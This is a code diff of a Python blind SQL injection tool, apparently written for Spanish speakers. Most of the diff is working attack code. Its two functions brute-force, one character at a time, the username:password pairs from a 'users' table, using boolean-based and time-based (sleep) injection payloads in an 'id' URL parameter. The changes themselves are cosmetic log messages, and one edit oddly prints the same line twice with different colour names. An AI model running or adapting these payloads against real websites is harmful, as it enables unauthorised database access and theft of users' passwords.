@@ -160,7 +160,7 @@ def makeSQLI(main_url, headers):
     for position in tqdm(range(1, 150), desc="Fuerza bruta"):
         for character in range(33, 126):
             sqli_url = f"{main_url}?id=0 or (select(select ascii(substring(select group_concat(username,0x3a,password) from users), {position},1)) from users where id = 1)={character}"
-            p1.status(colored(sqli_url, Colores.GREEN))
+            p1.status(colored(f"[+] {sqli_url} iniciado...", Colores.GREEN))
             
             try:
                 r = requests.get(sqli_url, headers=headers)
@@ -170,7 +170,7 @@ def makeSQLI(main_url, headers):
             
             if r.status_code == 200:  
                 extracted_info += chr(character)
-                p1.status(colored(extracted_info, Colores.BLUE))
+                p1.status(colored(f"[*] {extracted_info}", Colores.BLUE))
                 break
 
 def makeTimeBasedSQLI(main_url, headers):
@@ -181,7 +181,7 @@ def makeTimeBasedSQLI(main_url, headers):
     for position in tqdm(range(1, 150), desc="Fuerza bruta"):
         for character in range(33, 126):
             sqli_url = f"{main_url}?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users), {position},1))={character}, sleep(0.35), 1)"
-            p1.status(colored(sqli_url, Colores.GREEN))
+            p1.status(colored(f"[+] {sqli_url} iniciado...", Colores.GREEN))
 
             time_start = time.time()
 
@@ -195,13 +195,14 @@ def makeTimeBasedSQLI(main_url, headers):
 
             if time_end - time_start > 0.35:  
                 extracted_info += chr(character)
-                p1.status(colored(extracted_info, Colores.BLUE))
+                p1.status(colored(f"[*] {extracted_info}", Colores.BLUE))
                 break
 
 class Progress:
     def __init__(self, task_name):
         self.task_name = task_name
-        print(colored(f"[+] {self.task_name} iniciado...", Colores.GREEN))
+        print(colored(f"[+] {self.task_name} iniciado...", Colores.VERDE))
+        print(colored(f"[+] {self.task_name} iniciado...", Colores.AZUL))
 
     def status(self, message):
         print(colored(f"[*] {self.task_name}: {message}", Colores.CYAN))
